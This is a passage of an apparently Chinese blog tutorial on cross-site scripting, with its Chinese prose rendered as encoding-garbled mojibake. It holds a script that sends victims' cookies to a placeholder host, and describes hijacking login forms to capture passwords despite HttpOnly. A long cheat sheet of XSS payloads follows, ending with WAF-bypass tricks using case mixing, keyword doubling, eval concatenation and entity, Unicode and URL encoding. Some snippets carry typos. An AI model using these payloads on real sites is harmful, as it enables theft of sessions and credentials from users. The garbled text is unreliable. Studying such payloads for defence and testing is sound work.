ã€‚æœåŠ¡å™¨çš„å“åº”ä¸ä¼šä»¥ä»»ä½•çš„å½¢å¼åŒ…å«æ”»å‡»è€…çš„è„šæœ¬ï¼Œå½“ç”¨æˆ·çš„æµè§ˆå™¨å¤„ç†è¿™ä¸ªå“åº”æ—¶ï¼ŒDOM å¯¹è±¡å°±ä¼šå¤„ç† xss ä»£ç ï¼Œå¯¼è‡´å­˜åœ¨ xss æ¼æ´</p><h3 id="ä½¿ç”¨jsä»£ç è·å–cookie"><a class="markdownIt-Anchor" href="#ä½¿ç”¨jsä»£ç è·å–cookie">#</a> ä½¿ç”¨ JS ä»£ç è·å– Cookie</h3><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> img=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);img.<span class="property">src</span>=<span class="string">&quot;http://xxxx/a?&quot;</span>+<span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;script&gt;</span><br></pre></td></tr></table></figure></div><h3 id="è·å–session"><a class="markdownIt-Anchor" href="#è·å–session">#</a> è·å– session</h3><p>æœ‰çš„æ—¶å€™è·å–äº† Cookieï¼Œä½†æ˜¯å°‘äº† Sessionï¼Œä¼šé€ æˆç™»ä¸è¿›åå°ï¼ŒæœåŠ¡å™¨å¼€å¯äº† Session éªŒè¯çš„è¯ï¼Œæˆ‘ä»¬åªè·å–å®¢æˆ·ç«¯çš„ Cookie æ˜¯æ²¡æœ‰åŠæ³•é€šè¿‡éªŒè¯çš„ï¼Œè€Œä¸”æˆ‘ä»¬ä¹Ÿæ— æ³•è·å–å­˜æ”¾åœ¨æœåŠ¡ç«¯çš„ Sessionã€‚å¦‚æœéœ€è¦è·å– Sessionï¼Œå¯ä»¥å€ŸåŠ©è¾…åŠ©æ–‡ä»¶ï¼Œæ¯”å¦‚è®¿é—® php æ¢é’ˆæ—¶å°±ä¼šæºå¸¦ Session</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/yRmvSg7rsHIXkQh.png" alt="image.png"></p><p>æƒ³åŠæ³•è¿›å…¥ phpinfo ()</p><p>åˆ©ç”¨ beef è¿›è¡Œé¡µé¢è·³è½¬</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/UZmWoGfNuz64Sxd.png" alt="image.png"></p><p>è·å–é¡µé¢æºç </p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/jcwyR6NYOaZg7ld.png" alt="image.png"></p><h3 id="httponly"><a class="markdownIt-Anchor" href="#httponly">#</a> HttpOnly</h3><p>å¦‚æœ Cookie ä¸­è®¾ç½®äº† HttpOnly å±æ€§ï¼Œé‚£ä¹ˆé€šè¿‡ JS è„šæœ¬å°†æ— æ³•è¯»å–åˆ° Cookie ä¿¡æ¯ï¼Œè¿™æ ·èƒ½æœ‰æ•ˆé˜²æ­¢ XSS æ”»å‡»ï¼Œçªƒå– Cookie å†…å®¹ã€‚ ä½†æ˜¯è¿˜æ˜¯å­˜åœ¨ xss è·¨ç«™è¯­å¥ï¼Œé˜»æ­¢çš„ä»…ä»…æ˜¯è·å– cookie</p><p>å„ç§ä¸»æµè¯­è¨€éƒ½æ”¯æŒ HttpOnly</p><h3 id="ååˆ¶httponly"><a class="markdownIt-Anchor" href="#ååˆ¶httponly">#</a> ååˆ¶ HttpOnly</h3><p>å½“å¯¹æ–¹å¼€å¯ HttpOnly æ—¶ï¼Œç›—å– cookie å°±ä¼šå¤±è´¥ã€‚ç™»å½•åå°çš„æ–¹å¼æœ‰ Cookie ç™»å½•å’Œè´¦å·å¯†ç ç™»å½•</p><p>ï¼ˆ1ï¼‰Cookie å½¢å¼<br>ï¼ˆ2ï¼‰ç›´æ¥è´¦å·å¯†ç ç™»å½•</p><p>â‘  è¯»å–ä¿å­˜è´¦å·å¯†ç <br>â€ƒâ€ƒé€šè¿‡çªƒå–ä¿å­˜åœ¨æœ¬åœ°çš„æ•°æ®ï¼ˆè´¦å·å¯†ç ï¼‰æ¥ç™»å½•åå°ï¼ˆéœ€è¦ xss äº§ç”Ÿäºç™»å½•åœ°å€ï¼Œåˆ©ç”¨è¡¨å•åŠ«æŒï¼‰</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/gBu43eYEGRdqSVX.png" alt="image.png"></p><p>typeã€idã€name é€šè¿‡æŸ¥çœ‹ç½‘ç«™æºä»£ç ä¸­çš„ç™»å½•æ¡†è¡¨å•</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/hk6GDgcZiR5MU49.png" alt="image.png"></p><p>â‘¡ è¯»å–æ²¡ä¿å­˜è´¦å·å¯†ç </p><p>é€šè¿‡è¡¨å•ï¼ˆç™»å½•æ¡†ï¼‰åŠ«æŒæ•°æ®ï¼ˆäº§ç”Ÿåœ¨åå°çš„ XSSï¼Œä¾‹å¦‚å­˜å‚¨å‹ XSS ç•™è¨€ç­‰ï¼‰</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/Csrn7KIPulTvi5M.png" alt="image.png"></p><p>åŠ«æŒåŸç†ï¼šæŠ“å–æ•°æ®åŒ…å¦å¤–å‘é€ä¸€ä»½åˆ°è·¨ç«™å¹³å°</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/ELwHWCM3kAbQiTl.png" alt="image.png"></p><p>ä½†æ˜¯å¦‚æœæ˜¯ https ç½‘ç«™çš„è¯ï¼Œæ•°æ®æ˜¯è¿›è¡Œäº† ssl åŠ å¯†ï¼Œè·å–äº†æ•°æ®ä¹‹åä¹Ÿæ˜¯å¾ˆéš¾è¯»å–åˆ°è´¦å·å¯†ç çš„ï¼Œé¸¡è‚‹æ–¹æ³•</p><h2 id="ä¸€äº›å¸¸è§æ ‡ç­¾"><a class="markdownIt-Anchor" href="#ä¸€äº›å¸¸è§æ ‡ç­¾">#</a> ä¸€äº›å¸¸è§æ ‡ç­¾</h2><p><code>&lt;script&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scirpt</span>&gt;</span>alert(&quot;xss&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;img&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">XSS</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;input&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#ç«äº‰ç„¦ç‚¹ï¼Œä»è€Œè§¦å‘onbluräº‹ä»¶</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;) <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#é€šè¿‡autofocuså±æ€§æ‰§è¡Œæœ¬èº«çš„focusäº‹ä»¶ï¼Œè¿™ä¸ªå‘é‡æ˜¯ä½¿ç„¦ç‚¹è‡ªåŠ¨è·³åˆ°è¾“å…¥å…ƒç´ ä¸Š,è§¦å‘ç„¦ç‚¹äº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»è§¦å‘</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;details&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">ontoggle</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#ä½¿ç”¨openå±æ€§è§¦å‘ontoggleäº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»è§¦å‘</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;svg&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;select&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#é€šè¿‡autofocuså±æ€§æ‰§è¡Œæœ¬èº«çš„focusäº‹ä»¶ï¼Œè¿™ä¸ªå‘é‡æ˜¯ä½¿ç„¦ç‚¹è‡ªåŠ¨è·³åˆ°è¾“å…¥å…ƒç´ ä¸Š,è§¦å‘ç„¦ç‚¹äº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»è§¦å‘</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;ifrme&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;video&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;audio&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span>  <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;body&gt;</code></p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=alert(<span class="string">&quot;xss&quot;</span>);&gt;</span><br></pre></td></tr></table></figure></div><p>åˆ©ç”¨æ¢è¡Œç¬¦ä»¥åŠ autofocusï¼Œè‡ªåŠ¨å»è§¦å‘ onscroll äº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»è§¦å‘</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span></span></span><br><span class="line"><span class="tag"><span class="attr">onscroll</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;textarea&gt;</code></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">onfocus</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;); <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;keygen&gt;</code></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">keygen</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span> //ä»…é™ç«ç‹</span><br></pre></td></tr></table></figure></div><p><code>&lt;marquee&gt;</code></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span><span class="tag">&lt;/<span class="name">marquee</span>&gt;</span> //Chromeä¸è¡Œï¼Œç«ç‹å’ŒIEéƒ½å¯ä»¥</span><br></pre></td></tr></table></figure></div><p><code>&lt;isindex&gt;</code></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>//ä»…é™äºIE</span><br></pre></td></tr></table></figure></div><p>åˆ©ç”¨ link è¿œç¨‹åŒ…å« js æ–‡ä»¶</p><p><strong>PSï¼šåœ¨æ—  CSP çš„æƒ…å†µä¸‹æ‰å¯ä»¥</strong></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">import</span> <span class="attr">href</span>=<span class="string">&quot;http://127.0.0.1/1.js&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="javascriptä¼ªåè®®"><a class="markdownIt-Anchor" href="#javascriptä¼ªåè®®">#</a> javascript ä¼ªåè®®</h3><p><a>æ ‡ç­¾</a></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(`xss`);&quot;</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;iframe&gt;</code>  æ ‡ç­¾</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;);&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;img&gt;</code>  æ ‡ç­¾</p><div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(<span class="string">&#x27;xss&#x27;</span>)&gt;<span class="comment">//IE7ä»¥ä¸‹</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;form&gt;</code>  æ ‡ç­¾</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;Javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="å…¶å®ƒ"><a class="markdownIt-Anchor" href="#å…¶å®ƒ">#</a> å…¶å®ƒ</h3><p><code>expression</code>  å±æ€§</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img style=<span class="string">&quot;xss:expression(alert(&#x27;xss&#x27;&#x27;))&quot;</span>&gt; <span class="comment">// IE7ä»¥ä¸‹</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color:rgb(&#x27;&#x27;ï¿½x:expression(alert(1))&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span> <span class="comment">//IE7ä»¥ä¸‹</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-id">#test</span>&#123;x:<span class="built_in">expression</span>(<span class="built_in">alert</span>(/XSS/))&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span> <span class="comment">// IE7ä»¥ä¸‹</span></span><br></pre></td></tr></table></figure></div><p><code>background</code>  å±æ€§</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">background</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span> //åœ¨Opera 10.5å’ŒIE6ä¸Šæœ‰æ•ˆ</span><br></pre></td></tr></table></figure></div><h2 id="ç»•è¿‡è¿‡æ»¤"><a class="markdownIt-Anchor" href="#ç»•è¿‡è¿‡æ»¤">#</a> ç»•è¿‡è¿‡æ»¤</h2><h3 id="1ç©ºæ ¼"><a class="markdownIt-Anchor" href="#1ç©ºæ ¼">#</a> 1. ç©ºæ ¼</h3><p>ç”¨ <code>/</code>  ä»£æ›¿ç©ºæ ¼:  <code>&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</code></p><h3 id="2è¿‡æ»¤å…³é”®è¯"><a class="markdownIt-Anchor" href="#2è¿‡æ»¤å…³é”®è¯">#</a> 2. è¿‡æ»¤å…³é”®è¯</h3><h4 id="å¤§å°å†™ç»•è¿‡"><a class="markdownIt-Anchor" href="#å¤§å°å†™ç»•è¿‡">#</a> å¤§å°å†™ç»•è¿‡</h4><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">sRc</span>=<span class="string">x</span> <span class="attr">onerRor</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="åŒå†™å…³é”®å­—"><a class="markdownIt-Anchor" href="#åŒå†™å…³é”®å­—">#</a> åŒå†™å…³é”®å­—</h4><p>æœ‰äº› waf å¯èƒ½ä¼šåªæ›¿æ¢ä¸€æ¬¡ä¸”æ˜¯æ›¿æ¢ä¸ºç©ºï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è€ƒè™‘åŒå†™å…³é”®å­—ç»•è¿‡</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">imimgg</span> <span class="attr">srsrcc</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="å­—ç¬¦æ‹¼æ¥"><a class="markdownIt-Anchor" href="#å­—ç¬¦æ‹¼æ¥">#</a> å­—ç¬¦æ‹¼æ¥</h4><h5 id="åˆ©ç”¨eval"><a class="markdownIt-Anchor" href="#åˆ©ç”¨eval">#</a> åˆ©ç”¨ eval</h5><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="åˆ©ç”¨top"><a class="markdownIt-Anchor" href="#åˆ©ç”¨top">#</a> åˆ©ç”¨ top</h5><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="string">`xss`</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="å…¶å®ƒå­—ç¬¦æ··æ·†"><a class="markdownIt-Anchor" href="#å…¶å®ƒå­—ç¬¦æ··æ·†">#</a> å…¶å®ƒå­—ç¬¦æ··æ·†</h4><p>æœ‰çš„ waf å¯èƒ½æ˜¯ç”¨æ­£åˆ™è¡¨è¾¾å¼å»æ£€æµ‹æ˜¯å¦æœ‰ xss æ”»å‡»ï¼Œå¦‚æœæˆ‘ä»¬èƒ½ fuzz å‡ºæ­£åˆ™çš„è§„åˆ™ï¼Œåˆ™æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å…¶å®ƒå­—ç¬¦å»æ··æ·†æˆ‘ä»¬æ³¨å…¥çš„ä»£ç äº†<br>ä¸‹é¢ä¸¾å‡ ä¸ªç®€å•çš„ä¾‹å­</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å¯åˆ©ç”¨æ³¨é‡Šã€æ ‡ç­¾çš„ä¼˜å…ˆçº§ç­‰</span><br><span class="line">1.&lt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);<span class="comment">//&lt;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">2.<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=&lt;/<span class="attr">title</span>&gt;</span>&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(`xss`);&quot;</span>&gt;</span> //å› ä¸ºtitleæ ‡ç­¾çš„ä¼˜å…ˆçº§æ¯”imgçš„é«˜ï¼Œæ‰€ä»¥ä¼šå…ˆé—­åˆtitleï¼Œä»è€Œå¯¼è‡´å‰é¢çš„imgæ ‡ç­¾æ— æ•ˆ</span><br><span class="line">3.<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> a=<span class="string">&quot;\\&quot;</span>;<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);<span class="comment">//&quot;;</span></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="ç¼–ç ç»•è¿‡"><a class="markdownIt-Anchor" href="#ç¼–ç ç»•è¿‡">#</a> ç¼–ç ç»•è¿‡</h4><h5 id="unicodeç¼–ç ç»•è¿‡"><a class="markdownIt-Anchor" href="#unicodeç¼–ç ç»•è¿‡">#</a> Unicode ç¼–ç ç»•è¿‡</h5><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#59;</span>&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="urlç¼–ç ç»•è¿‡"><a class="markdownIt-Anchor" href="#urlç¼–ç ç»•è¿‡">#</a> url ç¼–ç ç»•è¿‡</h5><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><span class="tag">&lt;/<span 